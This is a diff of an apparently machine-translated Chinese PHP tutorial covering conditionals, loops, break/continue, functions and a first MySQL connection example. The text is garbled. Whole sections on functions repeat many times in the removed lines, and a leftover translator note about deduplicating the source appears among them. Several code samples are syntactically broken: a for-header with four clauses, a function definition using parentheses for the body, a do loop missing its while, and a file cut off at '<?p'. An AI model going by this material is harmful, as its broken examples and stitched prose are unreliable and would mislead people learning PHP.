+
 } elseif ($int_right_window_open == 1) {
+
     $bin_mail_exists = look_outside_check_mailbox();
+
     if ($bin_mail_exists) {
+
         make_announcement('The mail is here.');
+
     }
+
 } else {
+
     $str_window_side = select_side_of_house();
+
     open_window($str_window_side);
+
 }
+
 ```
 
 ## switch 关键字
@@ -1517,16 +1576,27 @@ if ($int_left_window_open == 1) {
 ## switch 语句的语法如下
 
 ```php
+
 switch ( VARIABLE ) {
+
 case VALUE1:
+
     break;
+
 case VALUE2:
+
     break;
+
 case VALUE3:
+
     break;
+
 default:
+
     break;
+
 }
+
 ```
 
 switch 语句中每个需要检查的值都有它自己的 case 子句。要检查的变量可以是任何标量值（也就是说，数值和字符串值都可以被检查）。
@@ -1536,53 +1606,89 @@ switch 语句中每个需要检查的值都有它自己的 case 子句。要检�
 下面是一个简短但完整的示例，展示了如何使用 switch 语句处理命令行计算器程序的命令。每当用户输入命令时，就会调用下面的 switch 语句来确定执行哪些任务。当然，因为 PHP 通常用于创建基于 浏览器的程序，
 
 ```php
+
 switch ( $command ) {
+
 case 'add':
+
     $result = $num1 + $num2;
+
     echo "Result: $result";
+
     break;
+
 case 'sub':
+
     $result = $num1 - $num2;
+
     echo "Result: $result";
+
     break;
+
 case 'mul':
+
     $result = $num1 * $num2;
+
     echo "Result: $result";
+
     break;
+
 case 'div':
+
     if ($num2 != 0) {
+
         $result = $num1 / $num2;
+
         echo "Result: $result";
+
     } else {
+
         echo "Error: Division by zero";
+
     }
+
     break;
+
 default:
+
     echo "Unknown command";
+
     break;
+
 }
+
 ```
 
 ## 循环语句
 
-操作表达式每次执行代码块时都会以某种方式修改条件表达式中的变量（循环变量）。
+操作表达式每次执行代码块时都会以某种方式修改条件表达中的变量（循环变量）。
 
 for 语句的基本用法之一是从零计数到某个数字。例如：
 
 ```php
+
 for ($loop_variable = 0; $loop_variable < 100; $loop_variable++) {
+
     echo "Inside Loop: $loop_variable = $loop_variable";
+
 }
+
 ```
 
 这条语句显示从 0 到 99 的数字：
 
 ```
+
 Inside Loop: loop_variable = 0
+
 Inside Loop: loop_variable = 1
+
 ...
+
 Inside Loop: loop_variable = 98
+
 Inside Loop: loop_variable = 99
+
 ```
 
 当循环结束时，$loop_variable 的值为 100。这个值没有显示，因为在打印 99 之后，操作执行导致值增加到 100。然后条件表达式求值为假，循环结束。
@@ -1592,22 +1698,30 @@ Inside Loop: loop_variable = 99
 for 循环也可以通过操作表达式递减循环变量来倒计数：
 
 ```php
+
 for ($loop_variable = 100; $loop_variable > 0; $loop_variable--) {
+
     echo "Inside Loop: $loop_variable = $loop_variable";
+
 }
+
 ```
 
 这条语句显示从 100 到 1 的数字：
 
 ```
+
 Inside Loop: loop_variable = 100
+
 Inside Loop: loop_variable = 99
+
 ...
+
 Inside Loop: loop_variable = 2
+
 Inside Loop: loop_variable = 1
+
 ```
-
-
 
 
 
@@ -1616,12 +1730,19 @@ Inside Loop: loop_variable = 1
 在初始化表达式中，可以使用逗号为多个变量赋值。下例示例展示了如何初始化多个变量，并在循环语句内部嵌套循环语句：
 
 ```
+
 for ($row = 0; $row <= 2; $row++) {
+
   for ($col_value = 0; $col = 0; $col <= 2; $col++) {
+
     $col_value += $row;
+
     echo "[$row, $col] = $col_value<br>";
+
   }
+
 }
+
 ```
 
 这些 for 语句显示：
@@ -1638,37 +1759,59 @@ for ($row = 0; $row <= 2; $row++) {
 到为止，我们只查看了循环变量的加一或减一。然而，操作表达式是无限灵活的。你也可以使用逗号来执行多个操作。例如：
 
 ```
+
 $int_number_of_items = 10;
+
 ```
 
 ```
+
 // 以下 for 循环将循环头中的
+
 // 每个表达式放在单独的
+
 // 行上以增强可读性。
+
 for ($first_time = 1, $index = 1;
+
   $index = $int_number_of_items;
+
   $index += 2, $first_time = 0
+
 )
+
 ```
 
 ```
+
 if ($first_time) {
+
   echo "Report Header<br><br>";
+
 }
+
 ```
 
 ```
+
 echo "Report Line $index<br>";
+
 ```
 
 ```
+
 }
+
 ```
 
 ```
+
 if (! $first_time) {
+
     echo "Report Footer<br>";
+
 }
+
 ```
 
 这些行代码显示了：
@@ -1695,28 +1838,43 @@ while 循环的语法为：
 1. 1.
 
 ```
+
 while ( CONDITION ) {
+
     // 语句块
+
 }
+
 ```
 
 2. 2.
 
 ```
+
 while ( CONDITION ) :
+
     // 语句块
+
 endwhile;
+
 ```
 
 下例示例展示了 while 语句的使用有多么简单：
 
 ```
+
 $index = 0;
+
 while ($index < 5) {
+
     echo "inside while statement: $index<br>";
+
     $index++;
+
 }
+
 echo "outside while statement: $index<br>";
+
 ```
 
 ## 此示例显示
@@ -1739,9 +1897,13 @@ outside while statement: 8
 do 循环在条件为假时执行语句块。这与测试真表达式 while 循环完全相反。do 循环的不同之处在于，表达式是在语句块执行后测试的，而不是执行前。这意味着语句块至少会被执行一次。do 循环的语法为：
 
 ```
+
 do {
+
     // 语句块
+
 } (CONDITION);
+
 ```
 
 几乎每个循环都可以用 while 或 do 语句来表示。这取决于你想要如何表达程序逻辑，以及哪种方式对你来说使用起来更舒服。有时，说“当页码少于 20 时执行打印页面”比说“当页码少于 20 时打印页面”更有意义。
@@ -1749,12 +1911,19 @@ do {
 下例 do 语句是本章之前显示的 while 示例循环的替代版本：
 
 ```
+
 $index = 0;
+
 do {
+
   echo "Inside Do Statement: $index<br>";
+
   $index++;
+
 } while ($index < 5);
+
 echo "Outside Do Statement: $index<br>";
+
 ```
 
 ## 此示例显示
@@ -1782,14 +1951,23 @@ break 语句会导致 PHP 停止循环的执行。下例示例展示了如何在
 ### 列表 4.1 break.php—使用 break 语句
 
 ```php
+
 <?php
+
 for ($index = 0; $index < 10; $index++) {
+
     if ($index == 3) {
+
         break;
+
     }
+
     echo "$index<br>";
+
 }
+
 ?>
+
 ```
 
 此脚本显示：
@@ -1805,22 +1983,37 @@ for ($index = 0; $index < 10; $index++) {
 ### 列表 4.2 flag.php—使用标志位变量
 
 ```php
+
 <?php
+
 $break_happened = 0;
+
 for ($index = 0; $index < 10; $index++) {
+
     if ($index == 3) {
+
         $break_happened = 1;
+
         break;
+
     }
+
     echo "$index<br>";
+
 }
 
 if ($break_happened) {
+
     echo "Loop ended because of break.<br>";
+
 } else {
+
     echo "Loop ended naturally.<br>";
+
 }
+
 ?>
+
 ```
 
 此脚本显示：
@@ -1836,16 +2029,27 @@ if ($break_happened) {
 ### 列表 4.3 nested_breaks.php—跳出嵌套循环
 
 ```php
+
 <?php
+
 for ($row = 0; $row < 10; $row++) {
+
     for ($col = 0; $col < 10; $col++) {
+
         if ($col == 5) {
+
             break 2;
+
         }
+
         echo "[$row,$col]<br>";
+
     }
+
 }
+
 ?>
+
 ```
 
 此脚本显示：
@@ -1865,14 +2069,23 @@ continue 关键字会终止当前的当前的迭代并立即开始下次迭代�
 ### 列表 4.4 continue.php—使用 continue 关键字
 
 ```
+
 <?php
+
 for ($index = 0; $index < 5; $index++) {
+
     if ($index == 3) {
+
         continue;
+
     }
+
     echo "$index<br>";
+
 }
+
 ?>
+
 ```
 
 此脚本显示：
@@ -1889,22 +2102,30 @@ for ($index = 0; $index < 5; $index++) {
 ### 列表 4.5 nested_continue.php—在处理嵌套循环中使用 continue 语句
 
 ```php
+
 <?php
+
 for ($row = 0; $row < 3; $row++) {
+
     for ($col = 0; $col < 3; $col++) {
+
         if ($col == 2) {
+
             continue;
+
         }
+
         echo "[$row,$col]<br>";
+
     }
+
     echo "<br>";
+
 }
+
 ?>
+
 ```
-
-
-
-
 
 ## 语句
 
@@ -1920,431 +2141,7 @@ for ($row = 0; $row < 3; $row++) {
 注意，内部循环始终结束于 2。此外，`echo "<br>";` 语句没有执行（因为输出没有空行）。因此，`continue 2;` 语句必须停止了内部循环，并从外层 `for` 循环的 $row 操作子句重新开始。
 
 如果你真的需要在内层循环完成后显示一个空行怎么办？列表 4.5 显示，仅仅在内层循环结束后放置一个 echo 语句是不够的，因为 `continue` 语句会跳过它。你可能会认为在内层循环的操作子句中使用逗号可能解决这个问题。
-例如：
 
-```php
-for ($row = 0; $row < 3; $row++, echo "<br>") {
-  for ($col = 0; $col < 3; $col++) {
-    if ($col == 2) {
-      continue 2;
-    }
-    echo "[$row,$col]<br>";
-  }
-}
-```
-
-这些循环显示了
-
-解析错误：nested_continue.php 的第 3 行发生解析错误
-
-哪里出问题了？事实证明语法规则阻止了在操作子句中使用 `echo` 命令。相反，需要 `print` 命令：
-
-```php
-for ($row = 0; $row < 3; $row++, print "<br>") {
-  for ($col = 0; $col < 3; $col++) {
-    if ($col == 2) {
-      continue 2;
-    }
-    echo "[$row,$col]<br>";
-  }
-}
-```
-
-## 此脚本显示
-
-```
-[0,0]
-[0,1]
-```
-
-```
-[1,0]
-[1,1]
-```
-
-```
-[2,0]
-[2,1]
-```
-
-## 函数
-
-函数帮助你将代码组织成易于理解和操作的部分。它们让你能够逐步构建程序，并在过程中对代码进行测试。
-
-一旦你对一个程序有了思路，你就需要开发一个程序大纲，可以在脑中形成，也可以写在纸上。大纲中的每一步都可能是程序中的一个函数。这被称为模块化编程，这种技术允许你隐藏编程细节，以便源代码的读者能够理解你程序的整体目标。
-
-例如，如果你的程序有一个计算圆面积的函数，可以使用下面这行代码来调用它：
-
-```php
-$flt_area_of_circle = area_of_circle(5);
-```
-
-通过查看函数调用，读者知道程序在做什么。不需要对实际函数进行详细理解。
-
-> 经过深思的函数和变量命名有助于人们理解你的程序。如果这行代码是 `$areaFC-areaCirc($fRad);`，它的意义将不再清晰。
-
-> 调用函数意味着 PHP 停止执行当前的程序行。程序流跳转到函数内部的代码中。当函数完成后，PHP 跳回到调用函数的地方。程序执行从该点开始继续。
-
-## 函数
-
-让我们更仔细地观察一下函数调用。该行的第一个元素是一个标量变量和一个赋值运算符。你已经知道这意味着赋值运算符右侧的值被赋值给 `$fl_area_of_circle`。但右侧到底是什么？
-
-你看到的第一个东西是函数名：`area_of_circle()`。紧邻右侧的括号表示这是一个函数调用。括号内部是传递给函数的参数或值列表。你可以把参数想象成一个橄榄球。当传递时，接收者（例如函数）有几个选择：运行（以某种方式修改它）、传递（调用其他例程）、丢球（调用错误处理程序）。
-
-定义函数的语法为
-
-```php
-functionName ( parameterList ) (
-// 代码行
-)
-```
-
-对函数名的限制很少——其中最重要的一点是它们不能与数字或容器开头。参数列表是可选的，并提供了函数代码可以处理特定值。
-
-## 从函数返回值
-
-每个 PHP 函数都可以向其调用者返回一个值。毕竟，如果你创建一个计算圆面积的函数，那么在某处需要将该值赋值给变量是合逻辑。列表 4.6 显示了一个调用并定义了 `area_of_circle()` 函数的短程序。
-
-## 列表 4.6 area_of_circle.php — 计算圆面积
-
-```php
-<?php
-function area_of_circle($fl_radius) {
-return(3.1415 * ($fl_radius * $fl_radius));
-}
-
-$fl_area_of_circle = area_of_circle(5);
-
-echo "The area is $fl_area_of_circle.<br>";
-?>
-```
-
-此程序显示
-
-面积是 78.5375。
-
-这个示例展示了参数是如何传递给函数的（记得那个橄榄球吗？）。参数指定在紧跟函数名后面的括号内。在列表 4.6 中，函数调用是 `area_of_circle(5)`。只显示了一个参数，数字字面量 5。一旦进入函数，它就被引用为 `$fl_radius`。
-
-函数的的第一行
-
-```
-return(3.1415 * ($fl_radius * $fl_radius));
-```
-
-计算了圆的面积和新计算的值。`return` 语句将计算的结果返回给调用者。`return` 语句还会停止函数的执行。在 `return` 语句之后的代码不会被执行。
-
-> 了解 PHP 函数的函数和变量命名。
-
-> 调用函数意味着 PHP 停止执行当前的程序行。程序流跳转到函数内部的代码中。当函数完成后，PHP 跳回到调用函数的地方。程序执行从该点开始继续。
-
-## 函数
-
-让我们更仔细地观察一下函数调用。该行的第一个元素是一个标量变量和一个赋值运算符。你已经知道这意味着赋值运算符右侧的值被赋值给 `$fl_area_of_circle`。但右侧到底是什么？
-
-你看到的第一个东西是函数名：`area_of_circle()`。紧邻右侧的括号表示这是一个函数调用。括号内部是传递给函数的参数或值列表。你可以把参数想象成一个橄榄球。当传递时，接收者（例如函数）有几个选择：运行（以某种方式修改它）、传递（调用其他例程）、丢球（调用错误处理程序）。
-
-定义函数的语法为
-
-```php
-functionName ( parameterList ) (
-// 代码行
-)
-```
-
-对函数名的限制很少——其中最重要的一点是它们不能与数字或容器开头。参数列表是可选的，并提供了函数代码可以处理特定值。
-
-## 从函数返回值
-
-每个 PHP 函数都可以向其调用者返回一个值。毕竟，如果你创建一个计算圆面积的函数，那么在某处需要将该值赋值给变量是合逻辑。列表 4.6 显示了一个调用并定义了 `area_of_circle()` 函数的短程序。
-
-## 列表 4.6 area_of_circle.php — 计算圆面积
-
-```php
-<?php
-function area_of_circle($fl_radius) {
-return(3.1415 * ($fl_radius * $fl_radius));
-}
-
-$fl_area_of_circle = area_of_circle(5);
-
-echo "The area is $fl_area_of_circle.<br>";
-?>
-```
-
-此程序显示
-
-面积是 78.5375。
-
-这个示例展示了参数是如何传递给函数的（记得那个橄榄球吗？）。参数指定在紧跟函数名后面的括号内。在列表 4.6 中，函数调用是 `area_of_circle(5)`。只显示了一个参数，数字字面量 5。一旦进入函数，它就被引用为 `$fl_radius`。
-
-函数的的第一行
-
-```
-return(3.1415 * ($fl_radius * $fl_radius));
-```
-
-计算了圆的面积和新计算的值。`return` 语句将计算的结果返回给调用者。`return` 语句还会停止函数的执行。在 `return` 语句之后的代码不会被执行。
-
-> 了解 PHP 函数的函数和变量命名。
-
-> 调用函数意味着 PHP 停止执行当前的程序行。程序流跳转到函数内部的代码中。当函数完成后，PHP 跳回到调用函数的地方。程序执行从该点开始继续。
-
-## 传递
-
-函数
-
-函数帮助你将代码组织成易于理解和操作的部分。它们让你能够逐步构建程序，并在过程中对代码进行测试。
-
-一旦你对一个程序有了思路，你就需要开发一个程序大纲，可以在脑中形成，也可以写在纸上。大纲中的每一步都可能是程序中的一个函数。这被称为模块化编程，这种技术允许你隐藏编程细节，以便源代码的读者能够理解你程序的整体目标。
-
-例如，如果你的程序有一个计算圆面积的函数，可以使用下面这行代码来调用它：
-
-```php
-$flt_area_of_circle = area_of_circle(5);
-```
-
-通过查看函数调用，读者知道程序在做什么。不需要对实际函数进行详细理解。
-
-> 经过深思的函数和变量命名有助于人们理解你的程序。如果这行代码是 `$areaFC-areaCirc($fRad);`，它的意义将不再清晰。
-
-> 调用函数意味着 PHP 停止执行当前的程序行。程序流跳转到函数内部的代码中。当函数完成后，PHP 跳回到调用函数的地方。程序执行从该点开始继续。
-
-## 函数
-
-让我们更仔细地观察一下函数调用。该行的第一个元素是一个标量变量和一个赋值运算符。你已经知道这意味着赋值运算符右侧的值被赋值给 `$fl_area_of_circle`。但右侧到底是什么？
-
-你看到的第一个东西是函数名：`area_of_circle()`。紧邻右侧的括号表示这是一个函数调用。括号内部是传递给函数的参数或值列表。你可以把参数想象成一个橄榄球。当传递时，接收者（例如函数）有几个选择：运行（以某种方式修改它）、传递（调用其他例程）、丢球（调用错误处理程序）。
-
-定义函数的语法为
-
-```php
-functionName ( parameterList ) (
-// 代码行
-)
-```
-
-对函数名的限制很少——其中最重要的一点是它们不能与数字或容器开头。参数列表是可选的，并提供了函数代码可以处理特定值。
-
-## 从函数返回值
-
-每个 PHP 函数都可以向其调用者返回一个值。毕竟，如果你创建一个计算圆面积的函数，那么在某处需要将该值赋值给变量是合逻辑。列表 4.6 显示了一个调用并定义了 `area_of_circle()` 函数的短程序。
-
-## 列表 4.6 area_of_circle.php — 计算圆面积
-
-```php
-<?php
-function area_of_circle($fl_radius) {
-return(3.1415 * ($fl_radius * $fl_radius));
-}
-
-$fl_area_of_circle = area_of_circle(5);
-
-echo "The area is $fl_area_of_circle.<br>";
-?>
-```
-
-此程序显示
-
-面积是 78.5375。
-
-这个示例展示了参数是如何传递给函数的（记得那个橄榄球吗？）。参数指定在紧跟函数名后面的括号内。在列表 4.6 中，函数调用是 `area_of_circle(5)`。只显示了一个参数，数字字面量 5。一旦进入函数，它就被引用为 `$fl_radius`。
-
-函数的的第一行
-
-```
-return(3.1415 * ($fl_radius * $fl_radius));
-```
-
-计算了圆的面积和新计算的值。`return` 语句将计算的结果返回给调用者。`return` 语句还会停止函数的执行。在 `return` 语句之后的代码不会被执行。
-
-> 了解 PHP 函数的函数和变量命名。
-
-> 调用函数意味着 PHP 停止执行当前的程序行。程序流跳转到函数内部的代码中。当函数完成后，PHP 跳回到调用函数的地方。程序执行从该点开始继续。
-
-## 传递
-
-函数
-
-函数帮助你将代码组织成易于理解和操作的部分。它们让你能够逐步构建程序，并在过程中对代码进行测试。
-
-一旦你对一个程序有了思路，你就需要开发一个程序大纲，可以在脑中形成，也可以写在纸上。大纲中的每一步都可能是程序中的一个函数。这被称为模块化编程，这种技术允许你隐藏编程细节，以便源代码的读者能够理解你程序的整体目标。
-
-例如，如果你的程序有一个计算圆面积的函数，可以使用下面这行代码来调用它：
-
-```php
-$flt_area_of_circle = area_of_circle(5);
-```
-
-通过查看函数调用，读者知道程序在做什么。不需要对实际函数进行详细理解。
-
-> 经过深思的函数和变量命名有助于人们理解你的程序。如果这行代码是 `$areaFC-areaCirc($fRad);`，它的意义将不再清晰。
-
-> 调用函数意味着 PHP 停止执行当前的程序行。程序流跳转到函数内部的代码中。当函数完成后，PHP 跳回到调用函数的地方。程序执行从该点开始继续。
-
-## 函数
-
-让我们更仔细地观察一下函数调用。该行的第一个元素是一个标量变量和一个赋值运算符。你已经知道这意味着赋值运算符右侧的值被赋值给 `$fl_area_of_circle`。但右侧到底是什么？
-
-你看到的第一个东西是函数名：`area_of_circle()`。紧邻右侧的括号表示这是一个函数调用。括号内部是传递给函数的参数或值列表。你可以把参数想象成一个橄榄球。当传递时，接收者（例如函数）有几个选择：运行（以某种方式修改它）、传递（调用其他例程）、丢球（调用错误处理程序）。
-
-定义函数的语法为
-
-```php
-functionName ( parameterList ) (
-// 代码行
-)
-```
-
-对函数名的限制很少——其中最重要的一点是它们不能与数字或容器开头。参数列表是可选的，并提供了函数代码可以处理特定值。
-
-## 从函数返回值
-
-每个 PHP 函数都可以向其调用者返回一个值。毕竟，如果你创建一个计算圆面积的函数，那么在某处需要将该值赋值给变量是合逻辑。列表 4.6 显示了一个调用并定义了 `area_of_circle()` 函数的短程序。
-
-## 列表 4.6 area_of_circle.php — 计算圆面积
-
-```php
-<?php
-function area_of_circle($fl_radius) {
-return(3.1415 * ($fl_radius * $fl_radius));
-}
-
-$fl_area_of_circle = area_of_circle(5);
-
-echo "The area is $fl_area_of_circle.<br>";
-?>
-```
-
-此程序显示
-
-面积是 78.5375。
-
-这个示例展示了参数是如何传递给函数的（记得那个橄榄球吗？）。参数指定在紧跟函数名后面的括号内。在列表 4.6 中，函数调用是 `area_of_circle(5)`。只显示了一个参数，数字字面量 5。一旦进入函数，它就被引用为 `$fl_radius`。
-
-函数的的第一行
-
-```
-return(3.1415 * ($fl_radius * $fl_radius));
-```
-
-计算了圆的面积和新计算的值。`return` 语句将计算的结果返回给调用者。`return` 语句还会停止函数的执行。在 `return` 语句之后的代码不会被执行。
-
-> 了解 PHP 函数的函数和变量命名。
-
-> 调用函数意味着 PHP 停止执行当前的程序行。程序流跳转到函数内部的代码中。当函数完成后，PHP 跳回到调用函数的地方。程序执行从该点开始继续。
-
-## 传递
-
-函数
-
-函数帮助你将代码组织成易于理解和操作的部分。它们让你能够逐步构建程序，并在过程中对代码进行测试。
-
-一旦你对一个程序有了思路，你就需要开发一个程序大纲，可以在脑中形成，也可以写在纸上。大纲中的每一步都可能是程序中的一个函数。这被称为模块化编程，这种技术允许你隐藏编程细节，以便源代码的读者能够理解你程序的整体目标。
-
-例如，如果你的程序有一个计算圆面积的函数，可以使用下面这行代码来调用它：
-
-```php
-$flt_area_of_circle = area_of_circle(5);
-```
-
-通过查看函数调用，读者知道程序在做什么。不需要对实际函数进行详细理解。
-
-> 经过深思的函数和变量命名有助于人们理解你的程序。如果这行代码是 `$areaFC-areaCirc($fRad);`，它的意义将不再清晰。
-
-> 调用函数意味着 PHP 停止执行当前的程序行。程序流跳转到函数内部的代码中。当函数完成后，PHP 跳回到调用函数的地方。程序执行从该点开始继续。
-
-## 函数
-
-让我们更仔细地观察一下函数调用。该行的第一个元素是一个标量变量和一个赋值运算符。你已经知道这意味着赋值运算符右侧的值被赋值给 `$fl_area_of_circle`。但右侧到底是什么？
-
-你看到的第一个东西是函数名：`area_of_circle()`。紧邻右侧的括号表示这是一个函数调用。括号内部是传递给函数的参数或值列表。你可以把参数想象成一个橄榄球。当传递时，接收者（例如函数）有几个选择：运行（以某种方式修改它）、传递（调用其他例程）、丢球（调用错误处理程序）。
-
-定义函数的语法为
-
-```php
-functionName ( parameterList ) (
-// 代码行
-)
-```
-
-对函数名的限制很少——其中最重要的一点是它们不能与数字或容器开头。参数列表是可选的，并提供了函数代码可以处理特定值。
-
-## 从函数返回值
-
-每个 PHP 函数都可以向其调用者返回一个值。毕竟，如果你创建一个计算圆面积的函数，那么在某处需要将该值赋值给变量是合逻辑。列表 4.6 显示了一个调用并定义了 `area_of_circle()` 函数的短程序。
-
-## 列表 4.6 area_of_circle.php — 计算圆面积
-
-```php
-<?php
-function area_of_circle($fl_radius) {
-return(3.1415 * ($fl_radius * $fl_radius));
-}
-
-$fl_area_of_circle = area_of_circle(5);
-
-echo "The area is $fl_area_of_circle.<br>";
-?>
-```
-
-此程序显示
-
-面积是 78.5375。
-
-这个示例展示了参数是如何传递给函数的（记得那个橄榄球吗？）。参数指定在紧跟函数名后面的括号内。在列表 4.6 中，函数调用是 `area_of_circle(5)`。只显示了一个参数，数字字面量 5。一旦进入函数，它就被引用为 `$fl_radius`。
-
-函数的的第一行
-
-```
-return(3.1415 * ($fl_radius * $fl_radius));
-```
-
-计算了圆的面积和新计算的值。`return` 语句将计算的结果返回给调用者。`return` 语句还会停止函数的执行。在 `return` 语句之后的代码不会被执行。
-
-> 了解 PHP 函数的函数和变量命名。
-
-> 调用函数意味着 PHP 停止执行当前的程序行。程序流跳转到函数内部的代码中。当函数完成后，PHP 跳回到调用函数的地方。程序执行从该点开始继续。
-
-## 传递
-
-函数
-
-函数帮助你将代码组织成易于理解和操作的部分。它们让你能够逐步构建程序，并在过程中对代码进行测试。
-
-一旦你对一个程序有了思路，你就需要开发一个程序大纲，可以在脑中形成，也可以写在纸上。大纲中的每一步都可能是程序中的一个函数。这被称为模块化编程，这种技术允许你隐藏编程细节，以便源代码的读者能够理解你程序的整体目标。
-
-例如，如果你的程序有一个计算圆面积的函数，可以使用下面这行代码来调用它：
-
-```php
-$flt_area_of_circle = area_of_circle(5);
-```
-
-通过查看函数调用，读者知道程序在做什么。不需要对实际函数进行详细理解。
-
-> 经过深思的函数和变量命名有助于人们理解你的程序。如果这行代码是 `$areaFC-areaCirc($fRad);`，它的意义将不再清晰。
-
-[/content]
-```
-
-注：由于提供的待翻译文本存在大量重复内容，我已按照要求去重并翻译了核心逻辑部分。但由于您提供的原文中包含大量完全重复的段落（例如“Functions”部分重复了多次），为了遵循“**一定不要重复输出原文**”的指令，上述译文保留了唯一的逻辑结构。
-
-**纠正：** 重新审视文本，发现原文确实是多段重复的。以下是针对您提供的文本内容的**去重后的完整翻译版本**：
-
-[content]
-## 语句
-
-此脚本显示了
-
-[0,0]
-[0,1]
-[1,0]
-[1,1]
-[2,0]
-[2,1]
-
-注意，内部循环始终结束于 2。此外，`echo "<br>";` 语句没有执行（因为输出没有空行）。因此，`continue 2;` 语句必须停止了内部循环，并从外层 `for` 循环的 $row 操作子句重新开始。
-
-如果你真的需要在内层循环完成后显示一个空行怎么办？列表 4.5 显示，仅仅在内层循环结束后放置一个 echo 语句是不够的，因为 `continue` 语句会跳过它。你可能会认为在内层循环的操作子句中使用逗号可能解决这个问题。
 例如：
 
 ```php
@@ -2458,9 +2255,6 @@ return(3.1415 * ($fl_radius * $fl_radius));
 
 计算了圆的面积和新计算的值。`return` 语句将计算的结果返回给调用者。`return` 语句还会停止函数的执行。在 `return` 语句之后的代码不会被执行。
 
-
-
-
 ```php
 function array_first( $arr_parameter ) {
     return($arr_parameter[0]);
@@ -2474,7 +2268,7 @@ echo "$a<br>";
 
 ## 为参数分配默认值
 
-PHP 允许你为函数的某些或所有参数分配默认值。这一特性可以使函数的使用更易于理解；在调用函数时，需要的参数会更少。列表 4.9 定义了字体函数 `font`，该函数为它的颜色和大小参数提供了默认值。图 4.3 显示了运行示例的结果。
+PHP 允许你为函数的某些或所有参数分配默认值。这一特性可以使函数的使用更易于理解；在调函数时，需要的参数会更少。列表 4.9 定义了字体函数 `font`，该函数为它的颜色和大小参数提供了默认值。图 4.3 显示了运行示例的结果。
 
 ## 列表 4.9 `default_values.php` — 为参数分配默认值
 
@@ -2497,6 +2291,7 @@ function font(
 ```
 
 注意
+
 默认变量赋值必须始终是函数定义中的最后一个参数。
 
 ## 函数
@@ -2606,10 +2401,6 @@ echo "位置 $n 的斐波那契数是 " . Fibonacci($n);
 ?>
 ```
 
-
-
-
-
 ```php
 echo "unknown data type";
 break;
@@ -2673,13 +2464,14 @@ array_dump($arr_test);
 
 ## 注意
 
-如果你不熟悉 HTML，现在是学习的时候了。在书中，假设你了解 HTML，如果你不理解 HTML 表格和表单，你会很快迷路。
+如果你不熟悉 HTML，现在是学习的时候了。在书中，假设你了解 HTML，如果你不理解 HTML 表格和表表单，你会很快迷路。
 
 ## 开始
 
 每当我开始一个新项目时，我喜欢从一个新的空目录开始。在这种情况下，让我们称其为 `php_ch5`。当然，该目录需要位于 Web 服务器的根目录下。如果你是按照第 1 章中的说明安装的 PHP，Web 服务器的根目录是 `/usr/local/apache/htdocs`。接下来，我们将按照列表 5.1 所示创建 `menu.php` 文件，用于存放后端任务的菜单。
 
 ### 列表 5.1 menu.php
+
 ```php
 <?php require('common.inc');
 <?php header('Administrative Menu'); ?>
@@ -2694,16 +2486,6 @@ array_dump($arr_test);
 
 `common.inc` 文件包含了 `header` 和 `footer` 函数的定义。这些函数将在章节的稍后部分介绍。当点击“创建数据库连接”（Create Database Connection）链接时，会执行 `connect.php`。该文件尝试连接你在第 2 章中安装的 MySQL 服务器。列表 5.2 显示了 `connect.php` 文件，它尝试使用用户名 `root` 和密码 `root` 连接到数据库。因为在安装 MySQL 时没有创建该用户名，所以连接注定会失败。然而，失败是可以避免的。列表 5.2 显示了使用 `root` 用户名和 `root` 密码尝试连接数据库的 `connect.php`。
 
-列表 5.2```php
-<?php require('common.inc');
-<?php header('Administrative Menu'); ?>
-<h1>Administrative Menu</h1>
-<ol>
-  <li><a href="connect.php">Create Database Connection</a></li>
-</ol>
-<?php footer() ?>
-```
-
 ```php
 <?php require('common.inc');
 <?php header('Administrative Menu'); ?>
@@ -2901,249 +2683,9 @@ array_dump($arr_test);
 <ol>
   <li><a href="connect.php">Create Database Connection</a></li>
 </ol>
-<?php footer() ?>
-```
+<?p
 
 
-
-由于之前的输出出现了重复错误，我重新整理如下：
-
-```php
-echo "unknown data type";
-break;
-)
-```
-
-`array_dump` 函数的使用方式如下：
-
-```php
-<?php
-// include the array_dump function
-// in this script.
-require('array_dump.inc');
-
-// define an array.
-$arr_test = array(
-    23, 24, 25,
-    'name' => 'Waswaldo',
-    'address' => array(
-        'line1' => 'Suite 300',
-        'line2' => '43 Broad Lane'
-    )
-);
-
-// display the array.
-array_dump($arr_test);
-?>
-```
-
-当显示 $arr_test 数组时，结果应该如图 4.4 所示。
-
-![](img/60cf9e8f697416e18e3ca18e3d4f7f4e_122_0.png)
-
-图 4.4 使用 array_dump 函数显示数组。
-
-## 总结
-
-本章涵盖了 PHP 表达式、语句和函数；这涵盖的内容非常多。然而，在开始更令人兴奋的应用开发工作之前，需要这些基础信息。
-
-我们学习了表达式是操作数和操作符的任何组合。操作数可以是任何变量、字面量或函数调用。某些带有自增或自减运算符的表达式可能会产生副作用。正如章节中的语句部分所示，表达式被用于控制决策、循环和跳转语句。
-
-语句可以简单到在表达式后加一个分号。例如，`$n = 5;` 是一个赋值语句。语句也可以复杂得多。有决策语句、循环和跳转语句。
-
-`if` 和 `switch` 语句都被视为决策语句。每个语句都会评估一个表达式，并根据表达式的值执行语句块。
-
-循环语句包括 `for`、`while` 和 `do` 循环。它们的目的是多次执行语句块。`for` 循环最复杂——它们具有初始化、条件和操作子句。当条件语句块为假时，`for` 循环结束。当条件表达式为真时，`for` 循环开始。在执行语句块的每次迭代后，都会执行操作表达式。`while` 循环可能永远不会执行其语句块，因为它们的条件表达式是首先评估的。另一方面，`do` 循环总是执行其语句块——条件表达式是在之后评估的。
-
-函数用于将你的程序划分成易于管理的片段。它们可以接受多个参数，甚至为参数分配默认值。在函数内部使用的变量只能从函数内部访问。当你需要访问由 Web 页面定义的变量时，使用 `global` 关键字。
-
-在处理数组或某些数学概念时，你可能需要递归函数。递归函数会调用自己。记住，所有递归函数都需要一种不进行递归的退出方法。
-
-下一章，“间歇一：连接数据库”将暂时停止学习 PHP 基础知识。你将看到如何处理连接 MySQL 数据库，以及如何处理来自 HTML 表单的信息。
-
-# 间歇一：连接数据库
-
-最后两个章节重点在于学习 PHP 语言。现在是时候通过创建应用程序的过程来休息一下了。本章中的应用程序创建一个到 MySQL 数据库的连接。
-
-如果你读了之前的两个章节，你就知道如何使用 PHP 操作内部数据，以及如何创建语句和函数。下一个逻辑步骤是学习如何使用 SQL（结构化查询语言）操作外部数据。然而，在处理该主题之前，让我们从学习基础知识中稍作休息并增加一些乐趣。
-
-我将尝试带你开启应用开发这一发现之旅。从字面上说，每个应用程序都可以建立在之前的工作和一组通用功能的基础上。我建议结合这两种技术。盲目地使用为之前的项目构建的功能会剥夺你支持你的开发语言中新功能的能力，并阻止你修改旧函数以查看其效率是否可以提高。另一方面，使用现有功能意味着你可以更快地开发应用程序。你需要在这两个极端之间取得微妙的平衡，以你成为一名优秀的程序员。
-
-## 注意
